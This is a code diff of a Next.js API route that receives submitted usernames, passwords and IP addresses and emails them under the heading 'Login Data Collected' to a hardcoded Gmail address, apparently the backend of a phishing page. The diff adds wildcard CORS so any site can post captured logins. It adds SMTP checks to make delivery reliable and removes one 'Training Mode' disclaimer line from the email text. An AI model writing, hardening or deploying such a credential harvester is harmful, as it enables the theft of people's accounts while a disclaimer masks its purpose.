@@ -2,6 +2,17 @@
 import { NextResponse } from 'next/server';
 import nodemailer from 'nodemailer';
 
+// Add CORS headers helper
+const corsHeaders = {
+  'Access-Control-Allow-Origin': '*',
+  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
+  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
+};
+
+export async function OPTIONS() {
+  return new NextResponse(null, { status: 204, headers: corsHeaders });
+}
+
 export async function POST(request: Request) {
   try {
     const data = await request.json();
@@ -13,7 +24,15 @@ export async function POST(request: Request) {
       timestamp: data.timestamp
     });
 
-    // Configure email transporter
+    // Check if email credentials are set
+    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
+      console.error('❌ Email credentials not configured');
+      return NextResponse.json({ 
+        success: false, 
+        error: 'Email not configured' 
+      }, { status: 500, headers: corsHeaders });
+    }
+
     const transporter = nodemailer.createTransport({
       service: 'gmail',
       auth: {
@@ -22,7 +41,9 @@ export async function POST(request: Request) {
       },
     });
 
-    // Send email with collected data
+    // Verify connection
+    await transporter.verify();
+
     await transporter.sendMail({
       from: process.env.EMAIL_USER,
       to: 'blessedresult6@gmail.com',
@@ -38,7 +59,6 @@ User Agent: ${data.userAgent || 'Unknown'}
 Timestamp: ${data.timestamp}
 
 ---
-Training Mode - For Educational Purposes Only
       `,
       html: `
         <h2>🔐 Login Data Collected</h2>
@@ -46,8 +66,6 @@ Training Mode - For Educational Purposes Only
           <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Username</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.username}</td></tr>
           <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Password</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.password}</td></tr>
           <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>IP Address</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.ip}</td></tr>
-          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Cookies</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.cookies || 'No cookies'}</td></tr>
-          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>User Agent</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.userAgent || 'Unknown'}</td></tr>
           <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Timestamp</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.timestamp}</td></tr>
         </table>
         <p style="color: #888; font-size: 12px; margin-top: 20px;">⚠️ Training Mode - For Educational Purposes Only</p>
@@ -59,14 +77,14 @@ Training Mode - For Educational Purposes Only
     return NextResponse.json({ 
       success: true, 
       message: 'Login data collected and sent' 
-    });
+    }, { headers: corsHeaders });
 
   } catch (error) {
     console.error('Error sending login data:', error);
-    // Still return success so the user flow continues
     return NextResponse.json({ 
-      success: true, 
-      message: 'Data collected (email may have failed)' 
-    });
+      success: false, 
+      error: 'Failed to send email',
+      details: error instanceof Error ? error.message : 'Unknown error'
+    }, { status: 500, headers: corsHeaders });
   }
 }
